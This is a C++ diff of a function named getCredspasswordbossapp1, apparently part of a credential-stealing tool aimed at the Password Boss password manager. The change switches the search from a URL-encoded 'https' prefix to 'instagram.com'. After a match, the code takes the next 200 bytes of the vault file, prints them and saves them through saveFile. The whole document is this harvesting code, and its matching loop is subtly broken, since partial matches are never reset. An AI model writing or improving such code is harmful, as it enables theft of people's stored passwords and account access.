@@ -2,8 +2,7 @@
 #include <iostream>
 #include <fstream>
 #include <vector>
-#include <string>
-#include "../../core/saveFile.h"
+#include "../core/saveFile.h"
 
 int getCredspasswordbossapp1(std::string filename) {
     std::ifstream file(filename, std::ios::binary);
@@ -13,35 +12,34 @@ int getCredspasswordbossapp1(std::string filename) {
         return 1;
     }
 
-    std::vector<unsigned char> searchPattern = { 0x68, 0x74, 0x74, 0x70, 0x73, 0x25, 0x33, 0x41, 0x25, 0x32, 0x46 };
-    std::vector<unsigned char> foundData;
+    std::string searchSequence = "instagram.com";
+    std::vector<char> foundData;
 
     while (!file.eof()) {
-        unsigned char c;
-        file.read(reinterpret_cast<char*>(&c), sizeof(c));
+        char c;
+        file.get(c);
 
-        if (c == searchPattern[foundData.size()]) {
+        if (c == searchSequence[foundData.size()]) {
             foundData.push_back(c);
-            if (foundData.size() == searchPattern.size()) {
-                // We found the search pattern, now collect data until reaching the 100 data limit
-                std::vector<unsigned char> extractedData;
-                int dataCount = 0;
-
-                while (dataCount < 100 && !file.eof()) {
-                    file.read(reinterpret_cast<char*>(&c), sizeof(c));
+            if (foundData.size() == searchSequence.size()) {
+                // We found the search sequence, now collect the next 200 binary characters
+                std::vector<char> extractedData;
+                for (int i = 0; i < 200; i++) {
+                    file.get(c);
+                    if (file.eof()) {
+                        break;
+                    }
                     extractedData.push_back(c);
-                    dataCount++;
                 }
 
-                // Convert the binary data to a UTF-8 string
+                // Print the extracted data as UTF-8
                 std::string utf8ExtractedData(extractedData.begin(), extractedData.end());
-
-                // Print the extracted UTF-8 string
-                std::cout << "Pattern data: " + utf8ExtractedData << std::endl;
+                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;  // Add a newline
 
                 //Save into file
                 saveFile(utf8ExtractedData);
 
+                // Clear the foundData vector to search for the next occurrence
                 foundData.clear();
             }
         }
